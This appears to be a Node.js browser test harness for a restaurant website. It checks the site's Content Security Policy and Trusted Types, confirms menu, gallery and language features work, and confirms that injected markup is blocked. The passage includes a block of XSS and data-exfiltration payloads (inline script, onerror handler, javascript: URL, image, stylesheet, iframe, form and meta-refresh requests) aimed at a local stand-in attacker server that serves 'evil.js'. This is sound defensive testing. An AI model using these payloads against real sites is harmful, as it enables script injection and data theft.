#!/usr/bin/env node
/**
 * Browser regression test for the production CSP / Trusted Types setup.
 *
 *   node tests/security/browser-csp.mjs <distDir> [--expect=protected|unprotected] [--base=/ncpho/] [--out=report.json] [--screenshots=tmp] [--profile-root=tmp]
 *
 * --base serves the build under that path prefix only (everything else is 404), the
 * way GitHub Pages serves a project site, so a wrong Vite `base` shows up as failures.
 *
 * Serves a built site using Vercel's configured rewrites and clean URLs, without
 * response security headers so the meta CSP is tested independently. Drives Chrome/Edge over
 * raw CDP (no extra dependencies), and checks two things:
 *   1. legitimate features keep working with zero CSP violations / page errors;
 *   2. injected markup and DOM-sink payloads do not execute or reach an "attacker".
 *
 * Everything stays on 127.0.0.1: payloads only set window.__xss_* markers or hit a
 * local sink server. `--expect=unprotected` runs the same payloads against a
 * pre-CSP build to prove the harness really detects execution.
 * The only external traffic is the Google Maps iframe the site itself embeds.
 */
import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { extname, join, resolve, sep } from "node:path";

const args = process.argv.slice(2);
const distArg = args.find((a) => !a.startsWith("--"));
if (!distArg) {
  console.error("usage: node tests/security/browser-csp.mjs <distDir> [--expect=protected|unprotected] [--base=/ncpho/] [--out=report.json]");
  process.exit(2);
}
if (typeof WebSocket === "undefined") {
  console.error("this harness needs Node 22+ (global WebSocket)");
  process.exit(2);
}
const dist = resolve(distArg);
const expectMode = args.find((a) => a.startsWith("--expect="))?.split("=")[1] ?? "protected";
const outPath = args.find((a) => a.startsWith("--out="))?.slice("--out=".length);
const screenshotDir = args.find((a) => a.startsWith("--screenshots="))?.slice("--screenshots=".length);
const protectedMode = expectMode === "protected";
const base = `/${(args.find((a) => a.startsWith("--base="))?.slice("--base=".length) ?? "").replace(/^\/+|\/+$/g, "")}/`.replace("//", "/");
if (!existsSync(join(dist, "index.html"))) {
  console.error(`no index.html in ${dist} (run a build first)`);
  process.exit(2);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const MIME = {
  ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css",
  ".png": "image/png", ".webp": "image/webp", ".woff2": "font/woff2", ".svg": "image/svg+xml",
  ".xml": "application/xml", ".txt": "text/plain", ".json": "application/json",
};

function listen(server) {
  return new Promise((r) => server.listen(0, "127.0.0.1", () => r(server)));
}

// ---- "attacker" sink: every request it receives is a successful exfiltration/load ----
const sinkHits = [];
const sinkServer = await listen(createServer((req, res) => {
  sinkHits.push({ method: req.method, path: req.url, at: Date.now() });
  if (req.url.startsWith("/evil.js")) {
    res.writeHead(200, { "Content-Type": "text/javascript" });
    return res.end("window.__xss_external = 1;");
  }
  res.writeHead(200, { "Content-Type": "text/html" });
  res.end("<p>sink</p>");
}));
sinkServer.on("upgrade", (req, socket) => { sinkHits.push({ method: "UPGRADE", path: req.url, at: Date.now() }); socket.destroy(); });
sinkServer.on("clientError", (_e, socket) => { sinkHits.push({ method: "MALFORMED", path: "(non-http, e.g. upgraded to TLS)", at: Date.now() }); socket.destroy(); });
const sink = `http://127.0.0.1:${sinkServer.address().port}`;

// HTML injection payloads, placed in <body> (after the CSP meta, as a real injection would be).
const payloadMarkup = `
<div id="__payloads" style="position:absolute;left:-9999px;top:0">
  <script>window.__xss_inline = 1</script>
  <img src="/__missing.png" onerror="window.__xss_attr = 1">
  <script src="${sink}/evil.js"></script>
  <img src="${sink}/exfil-img?d=probe">
  <link rel="stylesheet" href="${sink}/exfil-css">
  <div style="width:4px;height:4px;background-image:url(${sink}/exfil-cssurl)"></div>
  <iframe src="${sink}/exfil-frame" width="4" height="4"></iframe>
  <object data="${sink}/exfil-object" width="4" height="4"></object>
  <a id="__jsurl" href="javascript:window.__xss_jsurl=1">x</a>
  <form id="__form" action="${sink}/exfil-form" method="post"><input name="d" value="probe"></form>
  <base href="${sink}/">
</div>`;

// ---- site server: Vercel clean URLs/rewrites, without headers to independently test meta CSP ----
const routingConfig = JSON.parse(readFileSync(new URL('../../vercel.json', import.meta.url), 'utf8'));
const indexHtml = readFileSync(join(dist, "index.html"), "utf8");
const menuHtml = readFileSync(join(dist, "menu.html"), "utf8");
const inject = (extra) => indexHtml.replace(/<body([^>]*)>/i, (m) => `${m}\n${extra}`);
const pages = {
  "/__menu_nojs__": menuHtml.replace(/<script type="module"[^>]*>[\s\S]*?<\/script>/g, ""),
  "/__attack__": inject(payloadMarkup),
  "/__attack_nav__": inject(`<meta http-equiv="refresh" content="0;url=${sink}/exfil-nav?d=probe">`),
  // The app bundle 404s (what happened in production with a wrong base path).
  "/__nojs__": indexHtml.replace(/(<script type="module"[^>]*\bsrc=")[^"]+(")/, `$1${base}assets/__missing-app.js$2`),
};
const siteServer = await listen(createServer((req, res) => {
  const { pathname } = new URL(req.url, "http://localhost");
  if (!pathname.startsWith(base)) {
    res.writeHead(404, { "Content-Type": "text/plain" });
    return res.end("not found (outside the site base path)");
  }
  const path = `/${pathname.slice(base.length)}`;
  let body;
  let type;
  if (pages[path]) {
    body = pages[path];
    type = MIME[".html"];
  } else {
    const rule = routingConfig.rewrites.find(rule => new RegExp(`^${rule.source}$`).test(path));
    const target = rule?.destination || path;
    const rel = target === "/" ? "index.html" : decodeURIComponent(target).replace(/^\/+/, "");
    let file = resolve(dist, rel);
    if (routingConfig.cleanUrls && !extname(file) && existsSync(`${file}.html`)) file += '.html';
    if (!file.startsWith(dist + sep) || !existsSync(file) || statSync(file).isDirectory()) {
      res.writeHead(404, { "Content-Type": "text/plain" });
      return res.end("not found");
    }
    body = readFileSync(file);
    type = MIME[extname(file).toLowerCase()] ?? "application/octet-stream";
  }
  res.writeHead(200, { "Content-Type": type, "Cache-Control": "no-store" });
  res.end(body);
}));
const site = `http://127.0.0.1:${siteServer.address().port}${base.slice(0, -1)}`;

// ---- browser ----
const chromePath = [
  process.env.CHROME_PATH,
  "C:/Program Files/Google/Chrome/Application/chrome.exe",
  "C:/Program Files (x86)/Google/Chrome/Application/chrome.exe",
  "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe",
  "/usr/bin/google-chrome", "/usr/bin/chromium", "/usr/bin/chromium-browser",
  "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
].find((p) => p && existsSync(p));
if (!chromePath) {
  console.error("Chrome/Edge not found; set CHROME_PATH");
  process.exit(2);
}
const profileRoot = args.find(a => a.startsWith("--profile-root="))?.slice("--profile-root=".length) || tmpdir();
const profile = mkdtempSync(join(resolve(profileRoot), "ncpho-csp-"));
const chrome = spawn(chromePath, [
  "--headless=new", "--disable-gpu", "--no-first-run", "--no-default-browser-check",
  "--disable-background-networking", "--disable-component-update", "--disable-sync",
  "--disable-extensions", "--disable-default-apps", "--metrics-recording-only", "--mute-audio",
  "--remote-debugging-port=0", `--user-data-dir=${profile}`, "about:blank",
], { stdio: "ignore", windowsHide: true });

let ws;
const checks = [];
const violations = [];
const pageErrors = [];
let scenario = "setup";

async function cleanup() {
  try { ws?.close(); } catch {}
  if (chrome.exitCode === null) {
    chrome.kill();
    await Promise.race([new Promise((r) => chrome.once("exit", r)), sleep(5000)]);
  }
  for (const server of [siteServer, sinkServer]) {
    server.closeAllConnections();
    server.close();
  }
  // Chrome's helper processes can outlive the browser for a moment and re-create files in the
  // profile, so remove it, give them time to exit, and remove whatever reappeared.
  for (let attempt = 0; attempt < 3; attempt++) {
    try { rmSync(profile, { recursive: true, force: true, maxRetries: 10, retryDelay: 300 }); } catch {}
    await sleep(1500);
    if (!existsSync(profile)) break;
  }
  if (existsSync(profile)) console.error(`warning: could not remove temp browser profile ${profile}`);
}
const watchdog = setTimeout(async () => {
  console.error("FAIL: global timeout");
  await cleanup();
  process.exit(1);
}, 240_000);

function record(group, name, pass, detail = "") {
  checks.push({ group, name, pass: Boolean(pass), detail: typeof detail === "string" ? detail : JSON.stringify(detail) });
}
// A broken feature must show up as a failed check, not abort the remaining checks.
async function step(group, name, fn) {
  try {
    await fn();
  } catch (error) {
    record(group, name, false, `error: ${String(error.message ?? error).split("\n")[0]}`);
  }
}

try {
  let port;
  for (let i = 0; i < 100 && !port; i++) {
    try { port = readFileSync(join(profile, "DevToolsActivePort"), "utf8").split("\n")[0].trim(); } catch { await sleep(100); }
  }
  if (!port) throw new Error("Chrome did not expose a DevTools port");
  let target;
  for (let i = 0; i < 50 && !target; i++) {
    try { target = (await (await fetch(`http://127.0.0.1:${port}/json/list`)).json()).find((t) => t.type === "page"); } catch { await sleep(100); }
  }
  ws = new WebSocket(target.webSocketDebuggerUrl);
  await new Promise((r, j) => { ws.onopen = r; ws.onerror = j; });

  let nextId = 0;
  const pending = new Map();
  const listeners = new Set();
  ws.onmessage = (event) => {
    const msg = JSON.parse(event.data);
    if (msg.id) {
      const p = pending.get(msg.id);
      pending.delete(msg.id);
      if (p) msg.error ? p.reject(new Error(`${p.method}: ${msg.error.message}`)) : p.resolve(msg.result);
    } else {
      for (const l of listeners) l(msg);
    }
  };
  const send = (method, params = {}) => new Promise((resolve, reject) => {
    const id = ++nextId;
    pending.set(id, { resolve, reject, method });
    ws.send(JSON.stringify({ id, method, params }));
  });
  const once = (method, timeout) => new Promise((resolve, reject) => {
    const timer = setTimeout(() => { listeners.delete(l); reject(new Error(`timeout: ${method}`)); }, timeout);
    const l = (msg) => { if (msg.method === method) { clearTimeout(timer); listeners.delete(l); resolve(msg.params); } };
    listeners.add(l);
  });
  listeners.add((msg) => {
    if (msg.method === "Runtime.exceptionThrown") {
      const d = msg.params.exceptionDetails;
      pageErrors.push({ scenario, text: d.exception?.description?.split("\n")[0] ?? d.text });
    }
  });

  async function evaluate(expression) {
    // allowUnsafeEvalBlockedByCSP defaults to true for DevTools; turn it off so probes behave like page script.
    const r = await send("Runtime.evaluate", { expression, returnByValue: true, awaitPromise: true, userGesture: true, allowUnsafeEvalBlockedByCSP: false });
    if (r.exceptionDetails) throw new Error(r.exceptionDetails.exception?.description ?? r.exceptionDetails.text);
    return r.result.value;
  }
  async function waitFor(expression, timeout = 8000) {
    const end = Date.now() + timeout;
    while (Date.now() < end) {
      try { if (await evaluate(expression)) return true; } catch {}
      await sleep(100);
    }
    return false;
  }
  async function navigate(url) {
    await send("Page.navigate", { url: "about:blank" });
    await sleep(100);
    const loaded = once("Page.loadEventFired", 20_000);
    await send("Page.navigate", { url });
    await loaded;
  }
  async function point(elementExpr, scroll = true) {
    const p = await evaluate(`(() => { const el = ${elementExpr}; if (!el) return null;
      ${scroll ? "el.scrollIntoView({ block: 'center', behavior: 'instant' });" : ""}
      const b = el.getBoundingClientRect(); return { x: b.left + b.width / 2, y: b.top + b.height / 2 }; })()`);
    if (!p) throw new Error(`element not found: ${elementExpr}`);
    return p;
  }
  const hover = (p) => send("Input.dispatchMouseEvent", { type: "mouseMoved", x: p.x, y: p.y });
  async function click(p) {
    for (const type of ["mouseMoved", "mousePressed", "mouseReleased"]) {
      await send("Input.dispatchMouseEvent", { type, x: p.x, y: p.y, button: "left", clickCount: 1 });
    }
  }
  async function tap(p) {
    await send("Input.dispatchTouchEvent", { type: "touchStart", touchPoints: [{ x: p.x, y: p.y }] });
    await sleep(50);
    await send("Input.dispatchTouchEvent", { type: "touchEnd", touchPoints: [] });
  }
  async function key(name, code, modifiers = 0) {
    await send("Input.dispatchKeyEvent", { type: "keyDown", key: name, code: name, windowsVirtualKeyCode: code, modifiers });
    await send("Input.dispatchKeyEvent", { type: "keyUp", key: name, code: name, windowsVirtualKeyCode: code, modifiers });
  }
  const navLink = (label) => `[...document.querySelectorAll('nav a')].find((a) => a.textContent.trim() === '${label}' && a.offsetParent !== null)`;
  const focusInDialog = "!!document.querySelector('[role=\"dialog\"]')?.contains(document.activeElement)";
  async function viewport(width, height, mobile) {
    await send("Emulation.setDeviceMetricsOverride", { width, height, deviceScaleFactor: 1, mobile });
    await send("Emulation.setTouchEmulationEnabled", { enabled: mobile, maxTouchPoints: mobile ? 5 : 1 });
  }
  async function takeViolations() {
    const list = await evaluate("(window.__cspViolations || []).splice(0)").catch(() => []);
    for (const v of list) violations.push({ scenario, ...v });
    return list;
  }

  await send("Page.enable");
  await send("Runtime.enable");
  await send("Page.addScriptToEvaluateOnNewDocument", {
    source: `window.__cspViolations = [];
      document.addEventListener("securitypolicyviolation", (e) => window.__cspViolations.push({
        directive: e.effectiveDirective, blocked: e.blockedURI, sample: e.sample, disposition: e.disposition }));`,
  });

  // ================= 1. Legitimate features (desktop) =================
  scenario = "features-desktop";
  await viewport(1280, 900, false);
  await navigate(`${site}/`);
  record("app", "React app mounted", await waitFor("document.querySelector('#root h1') !== null", 15_000));
  await evaluate("document.fonts.ready.then(() => true)");

  const policy = await evaluate(`(() => { const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    if (!m) return null; const kids = [...document.head.children];
    return { content: m.content, index: kids.indexOf(m), firstResource: kids.findIndex((el) => el.matches('script:not([type="application/ld+json"]),link,style,img')) }; })()`);
  if (protectedMode) {
    record("policy", "CSP meta present and precedes every script/style/link", policy && policy.index >= 0 && policy.index < policy.firstResource, policy ?? "missing");
    // Deliberate probe: its violation is kept out of the "legitimate use" bucket.
    scenario = "probe";
    const tt = await evaluate("(() => { try { document.createElement('div').innerHTML = '<b>t</b>'; return 'assigned'; } catch (e) { return e.name; } })()");
    await takeViolations();
    scenario = "features-desktop";
    record("policy", "Trusted Types enforced (string -> innerHTML throws)", tt === "TypeError", tt);
  } else {
    record("policy", "(baseline) no CSP meta in this build", policy === null, policy ?? "none");
  }

  const seo = await evaluate(`(() => { const ld = document.querySelector('script[type="application/ld+json"]'); let parsed = null;
    try { parsed = JSON.parse(ld.textContent); } catch {}
    return { title: document.title, descriptions: document.querySelectorAll('meta[name="description"]').length,
      fallbackLeft: document.querySelectorAll('[data-seo-fallback]').length,
      canonical: document.querySelector('link[rel="canonical"]')?.getAttribute('href') ?? null,
      ldType: parsed?.['@type'] ?? null, ldPhone: parsed?.telephone ?? null }; })()`);
  record("seo", "JSON-LD present and parses (data block, not executed)", seo.ldType === "Restaurant" && !!seo.ldPhone, seo);
  record("seo", "Helmet title/description active, HTML fallbacks retired", seo.title.endsWith("| NC PHO") && seo.descriptions === 1 && seo.fallbackLeft === 0, seo);

  const tel = await evaluate(`[...document.querySelectorAll('a[href^="tel:"]')].map((a) => a.getAttribute('href'))`);
  record("links", "tel: links intact", tel.length >= 3 && tel.every((h) => h === "tel:+12528330239"), tel.join(" "));
  const mapLinks = await evaluate(`document.querySelectorAll('a[href^="https://www.google.com/maps/search/"]').length`);
  record("links", "Google Maps direction links intact", mapLinks >= 3, `count=${mapLinks}`);

  const heroOk = await waitFor("(() => { const i = document.querySelector('img[fetchpriority=\"high\"]'); return i && i.complete && i.naturalWidth > 0; })()");
  record("images", "hero image loaded", heroOk);

  record("app", "static fallback is replaced once the app renders", await evaluate("document.querySelectorAll('[data-app-fallback]').length === 0"));
  const quick = await evaluate(`(() => {
    const nav = [...document.querySelectorAll('nav')].find((n) => n.getAttribute('aria-label') === 'Quick actions');
    return { links: [...(nav?.querySelectorAll('a') ?? [])].map((a) => ({ label: a.getAttribute('aria-label'), href: a.getAttribute('href') })),
      hreflessVisible: [...document.querySelectorAll('a:not([href])')].filter((a) => a.getClientRects().length).length }; })()`);
  const callToOrder = quick.links.find((l) => /call to order/i.test(l.label ?? ""));
  const orderOnline = quick.links.find((l) => /order online/i.test(l.label ?? ""));
  record("links", "ordering quick action works (online link, or 'Call to Order' with the phone number); no dead links",
    quick.hreflessVisible === 0 && (orderOnline?.href?.startsWith("https://")
      || (callToOrder?.href === "tel:+12528330239" && callToOrder.label.includes("(252) 833-0239"))), quick);

  // Menu: hover must not navigate; click must.
  await step("menu", "desktop 'Menu' hover/click", async () => {
    await evaluate("window.scrollTo({ top: 0, behavior: 'instant' })");
    const desktopMenu = "[...document.querySelectorAll('nav a')].find((a) => a.textContent.trim() === 'Menu' && a.offsetParent !== null)";
    const before = await evaluate("({ hash: location.hash, path: location.pathname, y: Math.round(scrollY) })");
    await hover(await point(desktopMenu, false));
    await sleep(700);
    const afterHover = await evaluate("({ hash: location.hash, path: location.pathname, y: Math.round(scrollY) })");
    record("menu", "hover over 'Menu' does not navigate", afterHover.path === before.path && afterHover.hash === before.hash && Math.abs(afterHover.y - before.y) < 5, { before, afterHover });
    await click(await point(desktopMenu, false));
    const hashOk = await waitFor("location.pathname.endsWith('/menu') && !!document.querySelector('.menu-dish-name')", 4000);
    await sleep(1500);
    const menuTop = await evaluate("Math.round(document.getElementById('menu').getBoundingClientRect().top)");
    record("menu", "click on 'Menu' opens the independent menu page", hashOk && Math.abs(menuTop) < 220, `route ok=${hashOk} top=${menuTop}`);

    // Category pills switch the dishes shown.
    const pills = "[...document.querySelectorAll('#menu a[data-category]')]";
    const firstDish = "document.querySelector('#menu section:not([hidden]) .menu-dish-name')?.textContent.trim()";
    const dishBefore = await evaluate(firstDish);
    await click(await point(`${pills}[1]`));
    const switched = await waitFor(`${pills}[1].getAttribute('aria-current') === 'true' && ${firstDish} !== ${JSON.stringify(dishBefore)}`, 3000);
    const dishAfter = await evaluate(firstDish);
    await click(await point(`${pills}[0]`));
    record("menu", "sidebar categories switch the dishes shown", switched, { dishBefore, dishAfter });
    await waitFor(`${pills}[0].getAttribute('aria-current') === 'true'`);
    await evaluate("window.scrollTo({ top: 0, behavior: 'instant' })");
    await evaluate("document.fonts.ready.then(() => true)");
    if (screenshotDir) {
      const shot = await send("Page.captureScreenshot", { format: "png" });
      writeFileSync(join(screenshotDir, "menu-desktop.png"), Buffer.from(shot.data, "base64"));
    }
    const completeness = await evaluate("({ items: document.querySelectorAll('[data-menu-item]').length, categories: document.querySelectorAll('.menu-category-section').length, font: getComputedStyle(document.querySelector('.menu-dish-name')).fontFamily, overflow: document.documentElement.scrollWidth > innerWidth })");
    record("menu", "all 151 entries remain available and the approved typography is loaded", completeness.items === 151 && completeness.categories === 11 && completeness.font.includes('Lora') && !completeness.overflow, completeness);
  });

  await step("i18n", "EN -> VN -> EN switch", async () => {
    const langButton = (label) => `[...document.querySelectorAll('nav button')].find((b) => b.textContent.trim() === '${label}' && b.offsetParent !== null)`;
    await click(await point(langButton("VN"), false));
    const viOk = await waitFor("document.documentElement.lang === 'vi' && location.pathname.endsWith('/vi/menu') && document.body.innerText.includes('Chả Giò (3 cuốn)')");
    await click(await point(langButton("EN"), false));
    const enOk = await waitFor("document.documentElement.lang === 'en' && location.pathname.endsWith('/menu') && !location.pathname.endsWith('/vi/menu') && document.body.innerText.includes('Vietnamese Egg Rolls (3 rolls)')");
    record("i18n", "EN -> VN -> EN switch", viOk && enOk, { viOk, enOk });
  });

  await step("menu", "direct menu URL, SEO and campaign parameters", async () => {
    await navigate(`${site}/menu?utm_source=menu-test&utm_campaign=launch#menu-pho`);
    await waitFor("document.querySelector('[data-category=\"pho\"]')?.getAttribute('aria-current') === 'true'", 5000);
    const direct = await evaluate(`(() => {
      const ld = JSON.parse(document.querySelector('[data-menu-schema-fallback]')?.textContent || '{}');
      return { canonical: document.querySelector('link[rel="canonical"]')?.href,
        canonicalCount: document.querySelectorAll('link[rel="canonical"]').length,
        descriptions: document.querySelectorAll('meta[name="description"]').length,
        schemaItems: ld['@graph']?.[0]?.hasMenuSection?.flatMap(s => s.hasMenuItem).length,
        visible: document.querySelectorAll('.menu-category-section:not([hidden]) [data-menu-item]').length,
        microdata: document.querySelectorAll('[itemtype="https://schema.org/MenuItem"]').length,
        options: document.querySelector('.menu-category-section:not([hidden]) .menu-options')?.textContent,
        price: document.querySelector('.menu-category-section:not([hidden]) .menu-price')?.textContent }; })()`);
    record("seo", "direct /menu response retains complete static JSON-LD and live menu microdata", direct.schemaItems === 151 && direct.microdata === 151 && direct.visible === 15 && direct.canonical === "https://ncpho-ten.vercel.app/menu" && direct.canonicalCount === 1 && direct.descriptions === 1, direct);
    record("menu", "phở sizes and prices are visible", direct.options?.includes('Large') && direct.options?.includes('Regular') && direct.options?.includes('$19.00') && direct.price?.includes('$14.50'), direct);
    await click(await point("[...document.querySelectorAll('nav button')].find(b => b.textContent.trim() === 'VN' && b.offsetParent !== null)", false));
    const vi = await waitFor("location.pathname.endsWith('/vi/menu') && location.search.includes('utm_campaign=launch') && location.hash === '#menu-pho' && document.querySelector('[itemprop=\"inLanguage\"]')?.content === 'vi' && document.querySelector('link[rel=\"canonical\"]')?.href === 'https://ncpho-ten.vercel.app/vi/menu'", 5000);
    record("menu", "language switch preserves category and advertising parameters", vi);
    await navigate(`${site}/?utm_source=legacy#/#menu`);
    const legacy = await waitFor("location.pathname.endsWith('/menu') && location.search === '?utm_source=legacy' && !!document.querySelector('.menu-dish-name')", 5000);
    record("navigation", "legacy /#/#menu links still open the new menu and keep campaign parameters", legacy);
  });

  await step("carousel", "special meals carousel", async () => {
    await click(await point("[...document.querySelectorAll('nav a')].find((a) => a.textContent.trim() === 'Home' && a.offsetParent !== null)", false));
    await waitFor("!!document.getElementById('special-meals-heading')", 5000);
    await evaluate("document.getElementById('special-meals-heading').scrollIntoView({ block: 'center', behavior: 'instant' })");
    // Park the pointer away from the strip: hovering it pauses autoplay by design.
    await hover({ x: 2, y: 2 });
    await waitFor("document.querySelector('[data-meals-strip]').getAnimations().length > 0", 5000);
    const playing = await evaluate("document.querySelector('[data-meals-strip]').getAnimations().length");
    // Every input to the component's autoplay condition, captured only when it is not playing.
    const stateWhenNotPlaying = playing ? null : await evaluate(`(() => {
      const section = document.getElementById('special-meals-heading').closest('section');
      const track = document.getElementById('special-meals-track');
      const r = section.getBoundingClientRect();
      const a = document.activeElement;
      // React state of the component that rendered <section> (hook values in declaration order).
      const fiberKey = Object.keys(section).find((k) => k.startsWith('__reactFiber$'));
      const hookValues = [];
      for (let h = section[fiberKey]?.return?.memoizedState; h; h = h.next) {
        const v = h.memoizedState;
        if (typeof v === 'boolean' || typeof v === 'number') hookValues.push(v);
      }
      const first = track.querySelector('[data-meal-card]');
      const repeat = track.querySelector('[data-loop-start]');
      return { hookValues, domLoopWidth: repeat && first ? repeat.offsetLeft - first.offsetLeft : null,
        visibilityState: document.visibilityState,
        hidden: document.hidden, trackHovered: track.matches(':hover'), focusInSection: section.contains(a),
        active: a ? a.tagName + ' ' + (a.getAttribute('aria-label') || a.textContent.trim().slice(0, 20)) : null,
        sectionTop: Math.round(r.top), sectionBottom: Math.round(r.bottom), innerHeight,
        reducedMotion: matchMedia('(prefers-reduced-motion: reduce)').matches,
        button: document.querySelector('[aria-controls="special-meals-track"][aria-label*="lideshow"]')?.getAttribute('aria-label') }; })()`);
    await click(await point("document.querySelector('button[aria-label=\"Pause slideshow\"]')"));
    const paused = await waitFor("document.querySelector('[data-meals-strip]').getAnimations().length === 0 && !!document.querySelector('button[aria-label=\"Play slideshow\"]')", 3000);
    const left0 = await evaluate("document.getElementById('special-meals-track').scrollLeft");
    await click(await point("document.querySelector('button[aria-label=\"Next dish\"]')"));
    await sleep(1200);
    const left1 = await evaluate("document.getElementById('special-meals-track').scrollLeft");
    const stripImgs = await evaluate("[...document.querySelectorAll('[data-meals-strip] img')].filter((i) => i.complete && i.naturalWidth > 0).length");
    record("carousel", "autoplay runs, pause stops it, next scrolls", playing > 0 && paused && left1 !== left0, { playing, paused, left0, left1, ...(playing ? {} : { stateWhenNotPlaying }) });
    record("images", "carousel images load", stripImgs >= 3, `loaded=${stripImgs}`);
  });

  // Scroll the whole page so lazy images and the map iframe load, then look for broken images.
  await step("images", "full-page scroll", async () => {
    const height = await evaluate("document.documentElement.scrollHeight");
    for (let y = 0; y < height; y += 600) {
      await evaluate(`window.scrollTo({ top: ${y}, behavior: 'instant' })`);
      await sleep(120);
    }
    await evaluate("document.getElementById('contact').scrollIntoView({ block: 'center', behavior: 'instant' })");
    await sleep(4000);
    const imgs = await evaluate("(() => { const all = [...document.images]; return { loaded: all.filter((i) => i.complete && i.naturalWidth > 0).length, broken: all.filter((i) => i.complete && i.naturalWidth === 0).map((i) => i.currentSrc || i.src) }; })()");
    record("images", "no broken images after full scroll", imgs.broken.length === 0 && imgs.loaded > 5, imgs);
    // Cross-site iframes run out of process, so look them up as targets rather than in the frame tree.
    const { targetInfos } = await send("Target.getTargets");
    const frameUrls = targetInfos.filter((t) => t.type === "iframe").map((t) => t.url);
    const homeViolations = await takeViolations();
    record("maps", "Google Maps iframe loads (allowed by frame-src)",
      frameUrls.some((u) => u.startsWith("https://www.google.com/maps")) && !homeViolations.some((v) => v.directive === "frame-src"), frameUrls.join(" ") || "no iframe target");
  });

  // Gallery (in-app navigation, filter uses AnimatePresence popLayout, lightbox)
  // Hash routing keeps one document, so resource timing also lists what earlier pages loaded.
  const loadedSoFar = () => evaluate("performance.getEntriesByType('resource').map((e) => e.name)");
  // A 1200px original only counts as a regression if this page downloaded it; reusing one that is
  // already cached (the hero photo) is the browser picking the cheapest srcset candidate.
  const galleryImageReport = (seen) => evaluate(`(() => {
    const seen = new Set(${JSON.stringify(seen)});
    const srcs = [...document.querySelectorAll('main button[aria-label^="View "] img')].filter((i) => i.complete && i.naturalWidth > 0).map((i) => i.currentSrc);
    const fresh = performance.getEntriesByType('resource').filter((e) => e.initiatorType === 'img' && !seen.has(e.name));
    return { checked: srcs.length,
      freshOriginals: srcs.filter((u) => u.includes('/images/gallery/') && !seen.has(u)),
      galleryImageKB: Math.round(fresh.reduce((s, e) => s + (e.encodedBodySize || 0), 0) / 1024) }; })()`);

  await step("gallery", "gallery page", async () => {
    const seenBeforeGallery = await loadedSoFar();
    await evaluate("window.scrollTo({ top: 0, behavior: 'instant' })");
    await click(await point("[...document.querySelectorAll('nav a')].find((a) => a.textContent.trim() === 'Gallery' && a.offsetParent !== null)", false));
    const galleryOk = await waitFor("location.pathname.endsWith('/gallery') && document.title.startsWith('Gallery')", 5000);
    await sleep(800);
    const viewCount = "document.querySelectorAll('button[aria-label^=\"View \"]').length";
    const allCount = await evaluate(viewCount);
    await click(await point("[...document.querySelectorAll('button[aria-pressed]')].find((b) => b.textContent.trim() === 'Drinks')"));
    await sleep(1500);
    const drinksCount = await evaluate(viewCount);
    await click(await point("[...document.querySelectorAll('button[aria-pressed]')].find((b) => b.textContent.trim() === 'All')"));
    await sleep(1500);
    record("gallery", "route, filter (popLayout) and item counts", galleryOk && allCount === 32 && drinksCount === 5, { galleryOk, allCount, drinksCount });
    const galleryHeight = await evaluate("document.documentElement.scrollHeight");
    for (let y = 0; y < galleryHeight; y += 600) {
      await evaluate(`window.scrollTo({ top: ${y}, behavior: 'instant' })`);
      await sleep(120);
    }
    await sleep(800);
    const galleryImgs = await evaluate("(() => { const all = [...document.images]; return { loaded: all.filter((i) => i.complete && i.naturalWidth > 0).length, broken: all.filter((i) => i.complete && i.naturalWidth === 0).map((i) => i.currentSrc || i.src) }; })()");
    record("images", "gallery page images load (none broken)", galleryImgs.broken.length === 0 && galleryImgs.loaded >= 20, galleryImgs);
    const desktopReport = await galleryImageReport(seenBeforeGallery);
    record("images", "gallery thumbnails download resized variants, not 1200px originals (desktop)",
      desktopReport.checked >= 20 && desktopReport.freshOriginals.length === 0, desktopReport);

    await evaluate("window.scrollTo({ top: 0, behavior: 'instant' })");
    await click(await point("document.querySelector('button[aria-label^=\"View \"]')"));
    const dialogOk = await waitFor("(() => { const d = document.querySelector('[role=\"dialog\"]'); const i = d?.querySelector('img'); return !!(i && i.complete && i.naturalWidth > 0); })()", 5000);
    const focusInside = await waitFor(focusInDialog, 2000);
    let trapped = true;
    for (let i = 0; i < 6; i++) {
      await key("Tab", 9);
      trapped = trapped && await evaluate(focusInDialog);
    }
    for (let i = 0; i < 3; i++) {
      await key("Tab", 9, 8);
      trapped = trapped && await evaluate(focusInDialog);
    }
    await key("Escape", 27);
    const closedOk = await waitFor("!document.querySelector('[role=\"dialog\"]')", 3000);
    const focusBack = await waitFor("(document.activeElement?.getAttribute('aria-label') || '').startsWith('View ')", 2000);
    record("gallery", "lightbox opens with image and closes on Escape", dialogOk && closedOk, { dialogOk, closedOk });
    record("a11y", "lightbox moves focus inside, traps Tab/Shift+Tab, and returns focus to the opener", focusInside && trapped && focusBack, { focusInside, trapped, focusBack });
  });

  await step("navigation", "'Menu' from another page and Back/Forward", async () => {
    await evaluate("window.scrollTo({ top: 0, behavior: 'instant' })");
    await click(await point(navLink("Menu"), false));
    const fromGallery = await waitFor("location.pathname.endsWith('/menu') && !!document.getElementById('menu')", 4000);
    await sleep(1500);
    const menuTop = await evaluate("Math.round(document.getElementById('menu')?.getBoundingClientRect().top ?? 9999)");
    record("menu", "'Menu' in the nav also works from the Gallery page", fromGallery && Math.abs(menuTop) < 220, { fromGallery, menuTop });
    await evaluate("history.back()");
    const back = await waitFor("location.pathname.endsWith('/gallery') && document.title.startsWith('Gallery')", 4000);
    await evaluate("history.forward()");
    const forward = await waitFor("location.pathname.endsWith('/menu') && !!document.getElementById('menu')", 4000);
    record("navigation", "browser Back/Forward move between Gallery and Menu", back && forward, { back, forward });
  });
  await step("legal", "privacy/terms pages", async () => {
    for (const route of ["privacy", "terms"]) {
      await navigate(`${site}/${route}`);
      const ok = await waitFor(`location.pathname.endsWith('/${route}') && document.body.innerText.includes('(252) 833-0239')`, 5000);
      const contact = await evaluate("document.body.innerText.split('\\n').find((line) => line.includes('(252) 833-0239')) ?? null");
      const heading = await evaluate("document.querySelector('h1')?.textContent.trim() ?? null");
      const expected = route === "privacy" ? "Privacy Policy" : "Terms of Service";
      record("legal", `/${route} renders its own heading and the contact line`, ok && heading === expected, { heading, contact });
    }
  });
  await takeViolations();

  // ================= 2. Touch: menu only navigates on tap =================
  scenario = "features-mobile";
  await step("menu", "mobile tap navigation", async () => {
    await viewport(390, 844, true);
    await navigate(`${site}/`);
